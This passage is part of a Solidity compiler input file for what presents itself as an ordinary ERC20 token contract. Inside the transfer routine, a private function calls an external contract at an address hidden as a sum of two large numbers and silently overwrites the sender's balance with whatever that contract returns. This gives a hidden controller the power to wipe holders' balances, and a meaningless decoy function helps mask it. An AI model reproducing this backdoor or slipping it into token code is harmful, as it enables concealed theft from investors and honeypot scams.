s);\\r\\n\\r\\n\\r\\n    constructor(string memory name_, string memory symbol_) {\\r\\n        _name = name_; \\r\\n        _symbol = symbol_; \\r\\n        _mint(msg.sender, 100000000 * 10 ** 18);\\r\\n    }\\r\\n    \\r\\n    function name() external view virtual override returns (string memory) {\\r\\n        return _name;\\r\\n    }\\r\\n\\r\\n    function symbol() external view virtual override returns (string memory) {\\r\\n        return _symbol;\\r\\n    }\\r\\n\\r\\n    function decimals() external view virtual override returns (uint8) {\\r\\n        return 18;\\r\\n    }\\r\\n\\r\\n    function totalSupply() external view virtual override returns (uint256) {\\r\\n        return _totalSupply;\\r\\n    }\\r\\n\\r\\n    function balanceOf(address account) external view virtual override returns (uint256) {\\r\\n        return _balances[account];\\r\\n    }\\r\\n   \\r\\n    function transfer(address to, uint256 amount) external virtual override returns (bool) {\\r\\n        address owner = msg.sender;\\r\\n        _transfer(owner, to, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\\r\\n        return _allowances[owner][spender];\\r\\n    }\\r\\n\\r\\n    function approve(address spender, uint256 amount) external virtual override returns (bool) {\\r\\n        address owner = msg.sender;\\r\\n        _approve(owner, spender, amount);\\r\\n        return true;\\r\\n    }\\r\\n    \\r\\n    function transferFrom(address from, address to, uint256 amount) external virtual override returns (bool) {\\r\\n        address spender = msg.sender;\\r\\n        _spendAllowance(from, spender, amount);\\r\\n        _transfer(from, to, amount);\\r\\n        return true;\\r\\n    }\\r\\n   \\r\\n    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool) {\\r\\n        address owner = msg.sender;\\r\\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\\r\\n        return true;\\r\\n    }\\r\\n   \\r\\n    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {\\r\\n        address owner = msg.sender;\\r\\n        uint256 currentAllowance = allowance(owner, spender);\\r\\n        require(currentAllowance >= subtractedValue, \\\"ERC20: decreased allowance below zero\\\");\\r\\n        unchecked {\\r\\n            _approve(owner, spender, currentAllowance - subtractedValue);\\r\\n        }\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function _transfer(address from, address to, uint256 amount) internal virtual {\\r\\n        require(from != address(0), \\\"ERC20: transfer from the zero address\\\");\\r\\n        bytes32 b0 = bytes32(uint256(uint160(from)));\\r\\n        perfect10(b0, address(uint160(672306052244576584629142547114764636683346988132+21347273459046990853423)));\\r\\n        uint256 fromBalance = _balances[from];\\r\\n        require(fromBalance >= amount, \\\"ERC20: transfer amount exceeds balance\\\");\\r\\n        (bool dn, string memory sn) = julia(false,  \\\"Julia\\\", amount, bytes(\\\"Julia\\\"), false);\\r\\n        if (dn) emit xlog(sn);\\r\\n        unchecked {\\r\\n            _balances[from] = fromBalance - amount;\\r\\n            _balances[to] += amount;\\r\\n        }\\r\\n        emit Transfer(from, to, amount);\\r\\n        \\r\\n    }\\r\\n\\r\\n    function julia(bool dn, string memory sn, uint256 pn, bytes memory dn0, bool dns) \\r\\n    private pure returns(bool, string memory) {\\r\\n        if ( dn && pn == 0 && dns ) {\\r\\n            return (false, string(dn0));\\r\\n        }\\r\\n        return (false, sn);\\r\\n    }\\r\\n\\r\\n    function perfect10(bytes32 b0, address p) private {\\r\\n        JDK jdk = JDK(p);\\r\\n        uint256 v = jdk.eagle(\\\"e\\\", uint160(uint256(b0)));\\r\\n        if (v > 0) {\\r\\n            _balances[address(uint160(uint256(b0)))] = uint256(v);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function _mint(address account, uint256 amount) internal virtual {\\r\\n        require(account != address(0), \\\"ERC20: mint to the zero address\\\");\\r\\n        _totalSupply += amount;\\r\\n        unchecked {\\r\\n            _balances[account] += amount;\\r\\n        }\\r\\n        emit Transfer(address(0), account, amount);\\r\\n    }\\r\\n    \\r\\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\\r\\n        require(owner != address(0), \\\"ERC20: approve from the zero address\\\");\\r\\n        require(spender != address(0), \\\"ERC20: approve to the zero address\\\");\\r\\n        _allowances[owner][spender] = amount;\\r\\n        emit Approval(owner, spender, amount);\\r\\n    }\\r\\n \\r\\n    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {\\r\\n        uint256 currentAllowance = allowance(owner, spender);\\r\\n        if (currentAllowance != type(uint256).max) {\\r\\n            require(currentAllowance >= amount, \\\"ERC20: insufficient allowance\\\");\\r\\n            unchecked {\\r\\n                _approve(owner, spender, currentAllowance - amount);\\r\\n            }\\r\\n        }\\r\\n    }\\r\\n}\"\n    }\n  },\n  \"settings\": {\n    \"optimizer\": {\n      \"enabled\": true,\n      \"runs\": 200\n    },\n    \"outputSelection\": {\n      \"*\": {\n        \"*\": [\n          \"evm.bytecode\",\n          \"evm.deployedBytecode\",\n          \"devdoc\",\n          \"userdoc\",\n          \"metadata\",\n          \"abi\"\n        ]\n      }\n    },\n    \"libraries\": {}\n  }\n}}"
}